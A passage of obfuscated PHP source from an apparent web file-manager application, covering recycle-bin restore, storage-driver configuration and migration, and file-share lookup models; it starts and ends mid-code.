$ÖŞ¼“Ä = array(); foreach ($æÛ¾¸½ä as $¼ºï¨ı) { if ($®…½ı°â != !1 && !in_array($¼ºï¨ı, $®…½ı°â)) { continue; } $êÙ¢«Ş = $»™¡•ã->sourceInfo($¼ºï¨ı); $¤–½ùœ± = $»™¡•ã->sourceInfo($êÙ¢«Ş[$³ÌÀŒ¨ï[192]]); if ($¤–½ùœ±[$³ÌÀŒ¨ï[507]] == $³ÌÀŒ¨ï[91]) { continue; } $»™¡•ã->lockMoveStart($¼ºï¨ı); $this->recycleMove($¼ºï¨ı, 0); if ($êÙ¢«Ş[$³ÌÀŒ¨ï[487]] == $³ÌÀŒ¨ï[91]) { $ïîèŒ = array($³ÌÀŒ¨ï[657] => array($³ÌÀŒ¨ï[617], $êÙ¢«Ş[$³ÌÀŒ¨ï[586]] . $¼ºï¨ı . $³ÌÀŒ¨ï[618])); $»™¡•ã->where($ïîèŒ)->setField($³ÌÀŒ¨ï[507], 0); $this->restoreFolderChildren($¼ºï¨ı, $æÛ¾¸½ä); } $this->where(array($³ÌÀŒ¨ï[193] => $¼ºï¨ı))->delete(); $»™¡•ã->folderSizeReset($êÙ¢«Ş[$³ÌÀŒ¨ï[192]]); $ÖŞ¼“Ä[] = $êÙ¢«Ş[$³ÌÀŒ¨ï[192]]; if ($êÙ¢«Ş[$³ÌÀŒ¨ï[487]] == $³ÌÀŒ¨ï[91]) { $ÖŞ¼“Ä[] = $¼ºï¨ı; } $»™¡•ã->lockMoveEnd($¼ºï¨ı); } $»™¡•ã->updateModifyTime($ÖŞ¼“Ä); } private function restoreFolderChildren($ûĞŠ ÍÊ, $­Êµê¬) { $ò¢â†•Š =& $_SERVER[ÔÕ±ĞšÎ]; $ÊÖ€«€© = Model($ò¢â†•Š[1423]); $´€Õ“æ = array($ò¢â†•Š[193] => array($ò¢â†•Š[7], array())); foreach ($­Êµê¬ as $×ŸÍòœ˜) { if ($×ŸÍòœ˜ == $ûĞŠ ÍÊ) { continue; } if (!$ÊÖ€«€©->isParentOf($ûĞŠ ÍÊ, $×ŸÍòœ˜)) { continue; } $ØòÔôÕ„ = $ÊÖ€«€©->sourceInfo($×ŸÍòœ˜); if ($ØòÔôÕ„[$ò¢â†•Š[487]] == $ò¢â†•Š[91]) { $´€Õ“æ[] = array($ò¢â†•Š[657] => array($ò¢â†•Š[617], $ØòÔôÕ„[$ò¢â†•Š[586]] . $×ŸÍòœ˜ . $ò¢â†•Š[618])); } else { $´€Õ“æ[$ò¢â†•Š[193]][1][] = $×ŸÍòœ˜; } } if (!$´€Õ“æ[$ò¢â†•Š[193]][1]) { unset($´€Õ“æ[$ò¢â†•Š[193]]); } if (!$´€Õ“æ) { return; } if (is_array($´€Õ“æ[$ò¢â†•Š[193]]) && is_array($´€Õ“æ[$ò¢â†•Š[193]][1])) { $´€Õ“æ[$ò¢â†•Š[193]][1] = array_unique($´€Õ“æ[$ò¢â†•Š[193]][1]); } $´€Õ“æ[$ò¢â†•Š[1079]] = $ò¢â†•Š[2081]; $ÊÖ€«€©->where($´€Õ“æ)->setField($ò¢â†•Š[507], 1); } private function recycleMove($¤ìãÂÀ, $êøÌÇ³Ç = 1) { $¦“ÃŸİ =& $_SERVER[ÔÕ±ĞšÎ]; $»ØÜì‡ = Model($¦“ÃŸİ[1423]); $·«ãŞ§Ñ = Model($¦“ÃŸİ[2309]); $ŞãûÀ‡Æ = array($¦“ÃŸİ[193] => $¤ìãÂÀ); if ($êøÌÇ³Ç) { $»ØÜì‡->where($ŞãûÀ‡Æ)->setField($¦“ÃŸİ[507], 1); $·«ãŞ§Ñ->eventRecycle($¤ìãÂÀ, $¦“ÃŸİ[2310]); } else { $¬‡…¢Éã = $»ØÜì‡->where($ŞãûÀ‡Æ)->find(); $ƒ‘–÷Ÿ€ = $¬‡…¢Éã[$¦“ÃŸİ[487]] == $¦“ÃŸİ[91]; $ÌÕ¶²»à = $»ØÜì‡->fileNameAuto($¬‡…¢Éã[$¦“ÃŸİ[192]], $¬‡…¢Éã[$¦“ÃŸİ[32]], REPEAT_RENAME_FOLDER, $ƒ‘–÷Ÿ€); if ($ÌÕ¶²»à != $¬‡…¢Éã[$¦“ÃŸİ[32]]) { $»ØÜì‡->rename($¤ìãÂÀ, $ÌÕ¶²»à); } $»ØÜì‡->where($ŞãûÀ‡Æ)->setField($¦“ÃŸİ[507], 0); $·«ãŞ§Ñ->eventRecycle($¤ìãÂÀ, $¦“ÃŸİ[2311]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\163\157\x75\x72\x63\145\123\145\143\x72\x65\x74\x4c\x69\x73\x74"; public $field = array("\163\157\165\162\x63\145\x49\x44", "\x74\171\160\x65\x49\104", "\x63\x72\145\x61\164\145\x55\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x73\164\157\x72\141\147\x65\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\x69\172\145\x4d\141\170", "\163\171\163\164\x65\x6d", "\144\145\x66\141\x75\x6c\164", "\x64\x72\x69\x76\x65\x72", "\143\157\156\146\151\147"); public function listData($ÆÁÏóÔ• = false, $ßòêµ÷ = "\x6d\157\x64\151\x66\171\124\151\x6d\x65", $³•™¦üº = false) { $õ‡£áßŸ =& $_SERVER[ÔÕ±ĞšÎ]; $™İê×¿Ò = parent::listData($ÆÁÏóÔ•, $ßòêµ÷, $³•™¦üº); if ($ÆÁÏóÔ•) { return $™İê×¿Ò; } $€‚ğù’« = array(); if ($GLOBALS[$õ‡£áßŸ[2312]]) { $€‚ğù’« = $this->ioSizeUseGet(array_to_keyvalue($™İê×¿Ò, $õ‡£áßŸ[12], $õ‡£áßŸ[477])); } foreach ($™İê×¿Ò as $è…¦èİ => $½¡ÍŞ§Ó) { unset($™İê×¿Ò[$è…¦èİ][$õ‡£áßŸ[6]]); $™İê×¿Ò[$è…¦èİ][$õ‡£áßŸ[1966]] = isset($€‚ğù’«[$½¡ÍŞ§Ó[$õ‡£áßŸ[477]]]) ? $€‚ğù’«[$½¡ÍŞ§Ó[$õ‡£áßŸ[477]]] : 0; } return $™İê×¿Ò; } public function ioSizeUseGet($°±áÉŞ) { $‘Ñª¶ƒı =& $_SERVER[ÔÕ±ĞšÎ]; if (!$°±áÉŞ) { return array(); } $àµû‡Š = $‘Ñª¶ƒı[2313] . implode($‘Ñª¶ƒı[50], $°±áÉŞ); $òõşÁ’¾ = Cache::get($àµû‡Š); if ($òõşÁ’¾) { return $òõşÁ’¾; } $Õ¯Àó‚ = array($‘Ñª¶ƒı[892] => $‘Ñª¶ƒı[477], $‘Ñª¶ƒı[2314] => $‘Ñª¶ƒı[79]); $Üà¦˜ = array($‘Ñª¶ƒı[892] => array($‘Ñª¶ƒı[7], $°±áÉŞ)); $òõşÁ’¾ = Model($‘Ñª¶ƒı[864])->field($Õ¯Àó‚)->where($Üà¦˜)->group($‘Ñª¶ƒı[892])->select(); $òõşÁ’¾ = array_to_keyvalue($òõşÁ’¾, $‘Ñª¶ƒı[477], $‘Ñª¶ƒı[79]); Cache::set($àµû‡Š, $òõşÁ’¾, 600); return $òõşÁ’¾; } public function getConfig($œ“€ØâÁ) { $º«ƒÙ‡ = parent::listData($œ“€ØâÁ); $È­ÆÜæß = _get($º«ƒÙ‡, $_SERVER[ÔÕ±ĞšÎ][6], array()); if ($È­ÆÜæß && !is_array($È­ÆÜæß)) { $È­ÆÜæß = json_decode($È­ÆÜæß, !0); } return $È­ÆÜæß; } public function update($à“—‰š, $¾ªŞ–Èâ) { $ËúÙ…„ =& $_SERVER[ÔÕ±ĞšÎ]; $ÇÍ¤Â¼‰ = $¾ªŞ–Èâ[$ËúÙ…„[32]]; $–¼€áøş = array_to_keyvalue(parent::listData(), $ËúÙ…„[32]); if (isset($–¼€áøş[$ÇÍ¤Â¼‰]) && $–¼€áøş[$ÇÍ¤Â¼‰][$ËúÙ…„[477]] != $à“—‰š) { return !1; } $this->checkPwd($à“—‰š, $¾ªŞ–Èâ); if (isset($¾ªŞ–Èâ[$ËúÙ…„[2315]]) && $¾ªŞ–Èâ[$ËúÙ…„[2315]] == $ËúÙ…„[91]) { $this->checkConfig($¾ªŞ–Èâ); } unset($¾ªŞ–Èâ[$ËúÙ…„[2315]]); $ÕÅ¼õÌ— = parent::update($à“—‰š, $¾ªŞ–Èâ); if ($ÕÅ¼õÌ— && $¾ªŞ–Èâ[$ËúÙ…„[37]]) { $¤÷¯¥×ö = 0; foreach ($–¼€áøş as $’«¿ùÀç) { if ($’«¿ùÀç[$ËúÙ…„[37]] && $’«¿ùÀç[$ËúÙ…„[477]] != $à“—‰š) { $¤÷¯¥×ö = $’«¿ùÀç[$ËúÙ…„[477]]; parent::update($’«¿ùÀç[$ËúÙ…„[477]], array($ËúÙ…„[37] => 0)); } } $this->updateBackup($à“—‰š, $¤÷¯¥×ö); } return $ÕÅ¼õÌ—; } public function add($Í·–Ç–è) { $°Î£§± =& $_SERVER[ÔÕ±ĞšÎ]; $ú¬¬”õà = array_to_keyvalue(parent::listData(), $°Î£§±[32]); if (isset($ú¬¬”õà[$Í·–Ç–è[$°Î£§±[32]]])) { return !1; } $this->checkConfig($Í·–Ç–è); $¶Ü¿ëº = parent::insert($Í·–Ç–è); if ($¶Ü¿ëº && $Í·–Ç–è[$°Î£§±[37]]) { foreach ($ú¬¬”õà as $®íôØøÕ) { if ($®íôØøÕ[$°Î£§±[37]]) { parent::update($®íôØøÕ[$°Î£§±[477]], array($°Î£§±[37] => 0)); } } } return $¶Ü¿ëº; } public function updateBackup($â­’ĞÆµ, $¹¼îÛØ÷) { $Í‰ÉÙ¡³ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$¹¼îÛØ÷) { return; } $è—­ĞØ¥ = Model($Í‰ÉÙ¡³[822])->config(); if ($è—­ĞØ¥[$Í‰ÉÙ¡³[1746]] != $Í‰ÉÙ¡³[91] || $è—­ĞØ¥[$Í‰ÉÙ¡³[826]] != $¹¼îÛØ÷) { return; } $ˆáãÄüÇ = Model($Í‰ÉÙ¡³[844])->get($Í‰ÉÙ¡³[858]); $ˆáãÄüÇ = json_decode($ˆáãÄüÇ, !0); if (!$ˆáãÄüÇ) { return; } $ˆáãÄüÇ[$Í‰ÉÙ¡³[826]] = $â­’ĞÆµ; Model($Í‰ÉÙ¡³[844])->set(array($Í‰ÉÙ¡³[858] => $ˆáãÄüÇ)); } public function checkPwd($¹ÛÉ¯Ğ, &$Â§Êß—Ñ) { $¡á© =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($Â§Êß—Ñ[$¡á©[6]])) { return; } $ÚŠÇ‡æİ = $Â§Êß—Ñ[$¡á©[6]]; if (!is_array($ÚŠÇ‡æİ)) { $ÚŠÇ‡æİ = json_decode($ÚŠÇ‡æİ, !0); } $“¼ö½ÊÜ = $¡á©[12]; $„Ş½ùÒ = array($¡á©[2316], $¡á©[2317], $¡á©[968]); foreach ($„Ş½ùÒ as $À•³ßÛé) { if (isset($ÚŠÇ‡æİ[$À•³ßÛé])) { $“¼ö½ÊÜ = $À•³ßÛé; break; } } if (!$“¼ö½ÊÜ) { return; } $ÖğÖ´„š = $this->getConfig($¹ÛÉ¯Ğ); $½éğåà = $ÖğÖ´„š[$“¼ö½ÊÜ]; $îßù¥­‡ = $ÚŠÇ‡æİ[$“¼ö½ÊÜ]; if ($îßù¥­‡ == str_repeat($¡á©[222], strlen($½éğåà))) { $ÚŠÇ‡æİ[$“¼ö½ÊÜ] = $½éğåà; $Â§Êß—Ñ[$¡á©[6]] = json_encode($ÚŠÇ‡æİ); } else { if ($îßù¥­‡ != $½éğåà) { $Â§Êß—Ñ[$¡á©[2315]] = $¡á©[91]; } } } public function checkConfig(&$ÄºÔâøã, $Í¼¾¬®  = false) { $ìßÍªÕÈ =& $_SERVER[ÔÕ±ĞšÎ]; $ØáóÆÓ = strtolower($ÄºÔâøã[$ìßÍªÕÈ[98]]); $Ìëôí¨Ğ = $ÄºÔâøã[$ìßÍªÕÈ[6]]; if (!is_array($Ìëôí¨Ğ)) { $Ìëôí¨Ğ = json_decode($Ìëôí¨Ğ, !0); } foreach ($Ìëôí¨Ğ as $£÷õÆÌ· => $ûñÅ²ŒÁ) { if (is_string($ûñÅ²ŒÁ)) { $Ìëôí¨Ğ[$£÷õÆÌ·] = trim($ûñÅ²ŒÁ); } } $Ìëôí¨Ğ[$ìßÍªÕÈ[2318]] = rand_string(6); $ø¾‹£©— = $GLOBALS[$ìßÍªÕÈ[6]][$ìßÍªÕÈ[92]][$ìßÍªÕÈ[900]]; $ğèÛí™¸ = isset($ø¾‹£©—[$ØáóÆÓ]) ? $ø¾‹£©—[$ØáóÆÓ] : ucfirst($ØáóÆÓ); $Ùª ÀÒ = $ìßÍªÕÈ[77] . $ğèÛí™¸; if (!$ğèÛí™¸ || !class_exists($Ùª ÀÒ)) { if ($Í¼¾¬® ) { return LNG($ìßÍªÕÈ[2319]); } write_log(array($ìßÍªÕÈ[2320], $ÄºÔâøã, get_caller_info()), $ìßÍªÕÈ[215]); show_json(LNG($ìßÍªÕÈ[2319]), !1, $ÄºÔâøã); } $ô¶©¯ã´ = new $Ùª ÀÒ($Ìëôí¨Ğ); if (in_array($ØáóÆÓ, $ô¶©¯ã´->objectDriver)) { try { if (!$ô¶©¯ã´->isBucketCors() && !$ô¶©¯ã´->setBucketCors()) { $íƒ‚¨  = LNG($ìßÍªÕÈ[2321]); $íƒ‚¨  .= $ìßÍªÕÈ[2322] . LNG($ìßÍªÕÈ[2323]); } } catch (Exception $ü°ƒ´½®) { $íƒ‚¨  = $ü°ƒ´½®->getMessage(); } if (isset($íƒ‚¨ )) { return $this->_parseError($íƒ‚¨ , $ØáóÆÓ, $Í¼¾¬® ); } if ($ØáóÆÓ == $ìßÍªÕÈ[68] && !$ô¶©¯ã´->checkRegion()) { return $this->_parseError(LNG($ìßÍªÕÈ[2324]), $ØáóÆÓ, $Í¼¾¬® ); } } $‘½€Ä…• = rtrim($Ìëôí¨Ğ[$ìßÍªÕÈ[1264]], $ìßÍªÕÈ[8]) . $ìßÍªÕÈ[8]; $À¶š¤ˆ = $ô¶©¯ã´->getPath($‘½€Ä…• . $ìßÍªÕÈ[1268]); try { if ($ØáóÆÓ == $ìßÍªÕÈ[109]) { $ô¶©¯ã´->mkdir($‘½€Ä…•); } $ˆ‚äáÌ = $ô¶©¯ã´->mkfile($À¶š¤ˆ); if (!$ˆ‚äáÌ) { $íƒ‚¨  = LNG($ìßÍªÕÈ[2321]); } } catch (Exception $ü°ƒ´½®) { $íƒ‚¨  = $ü°ƒ´½®->getMessage(); } if (isset($íƒ‚¨ )) { return $this->_parseError($íƒ‚¨ , $ØáóÆÓ, $Í¼¾¬® ); } $Ìëôí¨Ğ[$ìßÍªÕÈ[1264]] = $‘½€Ä…•; $ÄºÔâøã[$ìßÍªÕÈ[6]] = json_encode($Ìëôí¨Ğ); $ÄºÔâøã[$ìßÍªÕÈ[98]] = $ğèÛí™¸; return !0; } private function _parseError($»ïéû—š, $ÒÂïÙ·’, $±Œú½õ¸ = false) { $‚”Ó°¨½ =& $_SERVER[ÔÕ±ĞšÎ]; if ($ÒÂïÙ·’ == $‚”Ó°¨½[68] && stripos($»ïéû—š, $‚”Ó°¨½[2325])) { $ƒ¦¯—ü™ = explode($‚”Ó°¨½[10], $»ïéû—š); $öÎçôË = isset($ƒ¦¯—ü™[1]) ? $ƒ¦¯—ü™[1] : $‚”Ó°¨½[12]; $íÈ½ßè« = array($‚”Ó°¨½[2326] => LNG($‚”Ó°¨½[2327]), $‚”Ó°¨½[2328] => LNG($‚”Ó°¨½[2329])); if (isset($íÈ½ßè«[$öÎçôË])) { $»ïéû—š = $íÈ½ßè«[$öÎçôË]; } } if (stripos($»ïéû—š, $‚”Ó°¨½[2330]) === 0) { $Ëß°î€ = strpos($»ïéû—š, $‚”Ó°¨½[178]); if ($Ëß°î€ === !1) { $Ëß°î€ = strpos($»ïéû—š, $‚”Ó°¨½[4]); } if ($Ëß°î€ !== !1) { $»ïéû—š = substr($»ïéû—š, $Ëß°î€ + 1); } } $»ïéû—š = LNG($‚”Ó°¨½[1271]) . $»ïéû—š; if ($±Œú½õ¸) { return $»ïéû—š; } show_json($»ïéû—š, !1); } public function driverListSystem() { $æö˜¹–Ä =& $_SERVER[ÔÕ±ĞšÎ]; $ëêê¬ïĞ = parent::listData(); $Á¼Û†³ = array(); foreach ($ëêê¬ïĞ as $Ùº«­çö) { unset($Ùº«­çö[$æö˜¹–Ä[233]], $Ùº«­çö[$æö˜¹–Ä[88]]); if (!is_array($Ùº«­çö[$æö˜¹–Ä[6]])) { $Ùº«­çö[$æö˜¹–Ä[6]] = json_decode($Ùº«­çö[$æö˜¹–Ä[6]], !0); } $Á¼Û†³[] = $Ùº«­çö; } return $Á¼Û†³; } public function defaultDriver() { $œõ½¥­ =& $_SERVER[ÔÕ±ĞšÎ]; $¨öãŞ“º = parent::listData(); $ÍîÆì®¹ = array_filter_by_field($¨öãŞ“º, $œõ½¥­[37], 1); $ÍîÆì®¹ = $ÍîÆì®¹[0]; if (!$ÍîÆì®¹) { return array(); } if (!is_array($ÍîÆì®¹[$œõ½¥­[6]])) { $ÍîÆì®¹[$œõ½¥­[6]] = json_decode($ÍîÆì®¹[$œõ½¥­[6]], !0); } return $ÍîÆì®¹; } public function driverInfo($†›İïÙÈ) { $ô¥ºÏ±õ =& $_SERVER[ÔÕ±ĞšÎ]; $ùÌÊµù¿ = array_to_keyvalue(parent::listData(), $ô¥ºÏ±õ[477]); if (!isset($ùÌÊµù¿[$†›İïÙÈ])) { return !1; } $ÅïÖŸñÌ = $ùÌÊµù¿[$†›İïÙÈ]; if (!is_array($ÅïÖŸñÌ[$ô¥ºÏ±õ[6]])) { $ÅïÖŸñÌ[$ô¥ºÏ±õ[6]] = json_decode($ÅïÖŸñÌ[$ô¥ºÏ±õ[6]], !0); } return $ÅïÖŸñÌ; } public function remove($áÕõì™Ö) { $this->removeShareItems($áÕõì™Ö); return parent::remove($áÕõì™Ö); } public function removeWithFile($Ì¨òí¦µ, $ÅşÎ÷ùİ, $–¼·´©æ, $†¶³ôô = false) { $Ş±‚€°ú =& $_SERVER[ÔÕ±ĞšÎ]; $çîŒâ©š = array($Ş±‚€°ú[892] => $Ì¨òí¦µ); $”Ê©Æ€ô = Model($Ş±‚€°ú[546])->where($çîŒâ©š)->count(); $ÉÜ§ß§ä = Model($Ş±‚€°ú[546])->where($çîŒâ©š)->sum($Ş±‚€°ú[79]); $ªŒ»ø‡ = $ÅşÎ÷ùİ . $Ş±‚€°ú[2331] . $Ì¨òí¦µ; $…‹®Ãâ = LNG($ÅşÎ÷ùİ == $Ş±‚€°ú[625] ? $Ş±‚€°ú[2332] : $Ş±‚€°ú[2333]); $¼œ™Ø¨ = new TaskFileTransfer($ªŒ»ø‡, $Ş±‚€°ú[215], $”Ê©Æ€ô, $…‹®Ãâ . $Ş±‚€°ú[464] . $–¼·´©æ[$Ş±‚€°ú[32]] . $Ş±‚€°ú[214] . $Ì¨òí¦µ); $¼œ™Ø¨->task[$Ş±‚€°ú[837]] = (double) $ÉÜ§ß§ä; $äÙ²×¥µ = KodIO::defaultDriver(); $ìàï¯Ç³ = $äÙ²×¥µ[$Ş±‚€°ú[477]]; $“è´ä‹ = $Õ£´Ğ°‰ = $à¡ä‚Æ = array(); $Ç™ö¥Ğ” = Model($Ş±‚€°ú[232])->where($çîŒâ©š)->field($Ş±‚€°ú[2334])->select(); foreach ($Ç™ö¥Ğ” as $íõÃÒœ) { $äÂé±³Ø = $íõÃÒœ[$Ş±‚€°ú[543]]; if ($†¶³ôô) { $Õ£´Ğ°‰[] = $äÂé±³Ø; continue; } $ÉÌ¹¤”ƒ = $íõÃÒœ[$Ş±‚€°ú[87]]; $ûÃìÍÕ = get_path_father($ÉÌ¹¤”ƒ); $à¡ä‚Æ[] = $ûÃìÍÕ; $ûÃìÍÕ = str_replace("\173\151\157\72{$Ì¨òí¦µ}\175\x2f", "\x7b\x69\x6f\x3a{$ìàï¯Ç³}\175\x2f", $ûÃìÍÕ); if (!IO::exist($ÉÌ¹¤”ƒ)) { $“è´ä‹[] = $äÂé±³Ø; $¼œ™Ø¨->updateFileEnd($íõÃÒœ[$Ş±‚€°ú[32]], $íõÃÒœ[$Ş±‚€°ú[79]]); write_log($Ş±‚€°ú[2335] . $ÉÌ¹¤”ƒ, $Ş±‚€°ú[1909]); continue; } $ÂÕ˜Â”ü = IO::move($ÉÌ¹¤”ƒ, $ûÃìÍÕ, REPEAT_RENAME); if (!$ÂÕ˜Â”ü) { $Õ£´Ğ°‰[] = $äÂé±³Ø; $¼œ™Ø¨->updateFileEnd($íõÃÒœ[$Ş±‚€°ú[32]], $íõÃÒœ[$Ş±‚€°ú[79]]); write_log($Ş±‚€°ú[2336] . $ÉÌ¹¤”ƒ, $Ş±‚€°ú[1909]); continue; } $çîŒâ©š = array($Ş±‚€°ú[543] => $äÂé±³Ø); $¸Å£ÅÒ˜ = array($Ş±‚€°ú[892] => $ìàï¯Ç³, $Ş±‚€°ú[87] => $ÂÕ˜Â”ü); Model($Ş±‚€°ú[232])->where($çîŒâ©š)->save($¸Å£ÅÒ˜); } $¼ã Ñş« = $¼œ™Ø¨->task; if (!$†¶³ôô) { Cache::set($ªŒ»ø‡, $¼ã Ñş«); } $¼œ™Ø¨->end(); $“è´ä‹ = array_unique($“è´ä‹); $Õ£´Ğ°‰ = array_unique($Õ£´Ğ°‰); if (!$†¶³ôô && ($“è´ä‹ || $Õ£´Ğ°‰)) { $×³­¨åŠ = array(); if ($“è´ä‹) { $×³­¨åŠ[] = sprintf(LNG($Ş±‚€°ú[2337]), count($“è´ä‹)); } if ($Õ£´Ğ°‰) { $×³­¨åŠ[] = sprintf(LNG($Ş±‚€°ú[2338]), count($Õ£´Ğ°‰)); } $×³­¨åŠ = sprintf(LNG($Ş±‚€°ú[2339]), implode($Ş±‚€°ú[2340], $×³­¨åŠ)) . $Ş±‚€°ú[2341] . date($Ş±‚€°ú[2342]) . $Ş±‚€°ú[2343]; if ($ÅşÎ÷ùİ == $Ş±‚€°ú[1946]) { $×³­¨åŠ .= $Ş±‚€°ú[2344] . LNG($Ş±‚€°ú[2345]); } else { $×³­¨åŠ = LNG($Ş±‚€°ú[2346]) . $Ş±‚€°ú[2347] . $×³­¨åŠ; } $¼ã Ñş«[$Ş±‚€°ú[1266]] = $×³­¨åŠ; Cache::set($ªŒ»ø‡, $¼ã Ñş«); unset($–¼·´©æ[$Ş±‚€°ú[6]]); $Ç ™†·ğ = array($Ş±‚€°ú[477] => $Ì¨òí¦µ, $Ş±‚€°ú[2218] => $Ş±‚€°ú[625], $Ş±‚€°ú[32] => $–¼·´©æ[$Ş±‚€°ú[32]], $Ş±‚€°ú[98] => $–¼·´©æ[$Ş±‚€°ú[98]]); Hook::trigger($Ş±‚€°ú[1788], array($Ş±‚€°ú[1289] => $Ç ™†·ğ, $Ş±‚€°ú[1299] => !0)); show_json($×³­¨åŠ, !1, 100111); } if ($ÅşÎ÷ùİ == $Ş±‚€°ú[625]) { return !0; } if ($“è´ä‹ || $Õ£´Ğ°‰) { $³ÑŒÉñ‚ = array_merge($“è´ä‹, $Õ£´Ğ°‰); $³ÑŒÉñ‚ = array_filter(array_unique($³ÑŒÉñ‚)); $this->removeByFileID($³ÑŒÉñ‚); } if ($à¡ä‚Æ) { $à¡ä‚Æ = array_filter(array_unique($à¡ä‚Æ)); foreach ($à¡ä‚Æ as $ÉÌ¹¤”ƒ) { $İšÏü¶™ = IO::has($ÉÌ¹¤”ƒ, !0); if (!$İšÏü¶™[$Ş±‚€°ú[241]] && !$İšÏü¶™[$Ş±‚€°ú[242]]) { IO::remove($ÉÌ¹¤”ƒ); } } } return $this->remove($Ì¨òí¦µ); } private function removeByFileID($½ÎÇ°ßõ = array()) { $³ŞÈö¼¼ =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($½ÎÇ°ßõ)) { return; } $öØ·”§Ç = array($³ŞÈö¼¼[543] => array($³ŞÈö¼¼[7], $½ÎÇ°ßõ)); $ìÎå‡°® = Model($³ŞÈö¼¼[1423])->where($öØ·”§Ç)->field($³ŞÈö¼¼[193])->select(); if (!$ìÎå‡°®) { return Model($³ŞÈö¼¼[546])->remove($½ÎÇ°ßõ); } $ìÎå‡°® = array_to_keyvalue($ìÎå‡°®, $³ŞÈö¼¼[12], $³ŞÈö¼¼[193]); foreach ($ìÎå‡°® as $¹¾ÈÙıô) { Model($³ŞÈö¼¼[899])->removeNow($¹¾ÈÙıô, !1); } } private function removeShareItems($‹…ˆóó) { $¢Ò›ãØ =& $_SERVER[ÔÕ±ĞšÎ]; $ßâÂş–Ú = "\173\x69\157\72{$‹…ˆóó}\175\57"; $ÃõÉåİ¿ = array($¢Ò›ãØ[193] => 0, $¢Ò›ãØ[1259] => array($¢Ò›ãØ[461], "{$ßâÂş–Ú}\x25")); $­œŞ˜„™ = Model($¢Ò›ãØ[1957])->where($ÃõÉåİ¿)->field($¢Ò›ãØ[670])->select(); if (empty($­œŞ˜„™)) { return; } $üäªºã = array_to_keyvalue($­œŞ˜„™, $¢Ò›ãØ[12], $¢Ò›ãØ[670]); Model($¢Ò›ãØ[669])->remove($üäªºã); } } goto e³ù¼ïÊÓÒ; BÑí‘ïŸã: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\124\151\155\145", "\164\151\155\145", "\151\x6e\163\x65\x72\x74\54\x75\x70\x64\141\x74\x65", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x63\162\145\141\164\x65\124\x69\x6d\x65", "\164\x69\155\x65", "\x69\x6e\163\145\162\164", "\x66\x75\x6e\143\x74\151\157\156"), array("\157\160\x74\151\157\156\x73", '', "\151\156\163\145\162\164\54\165\160\144\141\164\x65\54\163\x65\154\145\x63\x74", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($¤†ÂÔõõ) { $Á÷›”‡¡ =& $_SERVER[ÔÕ±ĞšÎ]; $ù½ÖÁ×˜ = isset($¤†ÂÔõõ[0]) ? $¤†ÂÔõõ[0] : !1; $Ö¶êÆ½ = $Á÷›”‡¡[2122] . USER_ID; return array($Á÷›”‡¡[2123] => array(USER_ID, $Á÷›”‡¡[2124], $Ö¶êÆ½), $Á÷›”‡¡[2063] => array($ù½ÖÁ×˜, $Á÷›”‡¡[2125], $Ö¶êÆ½)); } protected function listSimple() { $Éë»˜· = array($_SERVER[ÔÕ±ĞšÎ][1777] => USER_ID); $ÜÊ´¤Š‰ = $this->field($this->fieldList)->where($Éë»˜·)->select(); return $ÜÊ´¤Š‰ ? $ÜÊ´¤Š‰ : array(); } protected function getInfo($õ“½Ìõî, $‚ëää¾ = false, $İŠßİ¹ú = '') { $‡Ş·£Îİ =& $_SERVER[ÔÕ±ĞšÎ]; if ($‚ëää¾) { return $this->_getShareInfo(array($‡Ş·£Îİ[670] => $õ“½Ìõî)); } $µ¿›¹Ê– = $this->cacheFunctionGet($‡Ş·£Îİ[2065], $õ“½Ìõî, $İŠßİ¹ú); return $µ¿›¹Ê–; } public function getInfoByHash($úğ’ŠŠ‰) { return $this->_getShareInfo(array($_SERVER[ÔÕ±ĞšÎ][2126] => $úğ’ŠŠ‰)); } public function getInfoByPath($´Îœ°è¹) { $ÆÑòã£© =& $_SERVER[ÔÕ±ĞšÎ]; $µÌ³Ç…™ = array($ÆÑòã£©[1777] => USER_ID, $ÆÑòã£©[193] => $´Îœ°è¹); return $this->_getShareInfo($µÌ³Ç…™); } public function getInfoBySourcePath($²õé½Ø½) { $É¹İ† È =& $_SERVER[ÔÕ±ĞšÎ]; $¹·ËÓÌÔ = array($É¹İ† È[1777] => USER_ID, $É¹İ† È[1259] => $²õé½Ø½); return $this->_getShareInfo($¹·ËÓÌÔ); } private function _getShareInfo($ÍÖ¥›š) { $•¦Ëœú‰ =& $_SERVER[ÔÕ±ĞšÎ]; $É†æÁíœ = $this->where($ÍÖ¥›š)->find(); if (!$É†æÁíœ) { return !1; } $ÍÖ¥›š = array($•¦Ëœú‰[670] => $É†æÁíœ[$•¦Ëœú‰[670]]); $÷¸¢¹¹Ô = $•¦Ëœú‰[2127]; $§øŞºğÜ = Model($•¦Ëœú‰[671])->order($•¦Ëœú‰[477])->field($÷¸¢¹¹Ô)->where($ÍÖ¥›š)->select(); if ($É†æÁíœ[$•¦Ëœú‰[193]] == $•¦Ëœú‰[230]) { $É†æÁíœ[$•¦Ëœú‰[90]] = IO::info($É†æÁíœ[$•¦Ëœú‰[1259]]); } else { $É†æÁíœ[$•¦Ëœú‰[90]] = Model($•¦Ëœú‰[1423])->pathInfo($É†æÁíœ[$•¦Ëœú‰[193]]); } $É†æÁíœ[$•¦Ëœú‰[2128]] = $§øŞºğÜ; return $É†æÁíœ; } protected function getInfoAuth($¦¾îáŞ) { $ä‹ÁÅÚñ =& $_SERVER[ÔÕ±ĞšÎ]; $ÓñÅéÌ” = $this->getInfo($¦¾îáŞ); if ($ÓñÅéÌ”[$ä‹ÁÅÚñ[1777]] == USER_ID) { $ÓñÅéÌ”[$ä‹ÁÅÚñ[489]] = $ÓñÅéÌ”[$ä‹ÁÅÚñ[90]][$ä‹ÁÅÚñ[489]]; } else { $ÓñÅéÌ”[$ä‹ÁÅÚñ[489]] = Model($ä‹ÁÅÚñ[569])->authMake($ÓñÅéÌ”[$ä‹ÁÅÚñ[2128]]); } return $ÓñÅéÌ”; } protected function listData($ò³ µ´ = null, $ÜÄ¤òí¡ = 300) { $»ˆÚé =& 